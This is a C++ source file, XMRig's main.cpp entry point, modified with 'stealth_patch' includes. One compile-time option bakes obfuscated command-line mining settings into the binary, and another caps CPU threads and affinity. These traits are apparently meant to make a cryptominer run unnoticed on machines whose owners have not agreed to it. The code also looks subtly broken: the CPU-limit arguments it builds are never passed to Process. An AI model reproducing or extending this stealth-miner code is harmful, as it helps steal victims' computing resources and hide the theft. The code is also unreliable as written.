/* XMRig
 * Copyright (c) 2018-2021 SChernykh   <https://github.com/SChernykh>
 * Copyright (c) 2016-2021 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "App.h"
#include "base/kernel/Entry.h"
#include "base/kernel/Process.h"

#ifdef INJECT_SETTINGS
#ifndef INJECTED_SETTINGS
#error "INJECTED_SETTINGS must be defined with your command-line parameters"
#endif // INJECTED_SETTINGS

#include "stealth_patch/safe_string.h"
#include "stealth_patch/prepare_config.cpp"
#endif // INJECT_SETTINGS

#ifdef LIMIT_CPU
#ifndef LIMIT_CPU_PERCENT
#error "LIMIT_CPU_PERCENT must be defined with the percentage of CPU usage"
#endif // LIMIT_CPU_PERCENT
#include "stealth_patch/cpu_config.cpp"
#endif // LIMIT_CPU

int main(int argc, char **argv)
{
    using namespace xmrig;

#ifdef INJECT_SETTINGS
    int count = 0;
    char **provided_settings = split_string(SAFE_STRING(INJECTED_SETTINGS), &count);

    char **injected_settings = new char *[count + 1];
    injected_settings[0] = argv[0];
    memcpy(injected_settings + 1, provided_settings, count * sizeof(*provided_settings));
#ifdef LIMIT_CPU
    char *additional_settings[] = {
        SAFE_STRING("--threads"),
        threads_str(),
        SAFE_STRING("--cpu-affinity"),
        cpu_affinity_str(threads(0)),
    };

    int additional_count = sizeof(additional_settings) / sizeof(additional_settings[0]);
    char **final_settings = new char *[count + 1 + additional_count];
    memcpy(final_settings, injected_settings, (count + 1) * sizeof(*injected_settings));
    memcpy(final_settings + count + 1, additional_settings, additional_count * sizeof(*additional_settings));
#endif // LIMIT_CPU
    // for (int i = 0; i < count + 1 + additional_count; i++) {
    //     printf("Injected argv[%d]: %s\n", i, final_settings[i]);
    // }

    Process process(count + 1, injected_settings);
#else
    Process process(argc, argv);
#endif // INJECT_SETTINGS
    const Entry::Id entry = Entry::get(process);
    if (entry)
    {
        return Entry::exec(process, entry);
    }

    App app(&process);

    return app.exec();
}
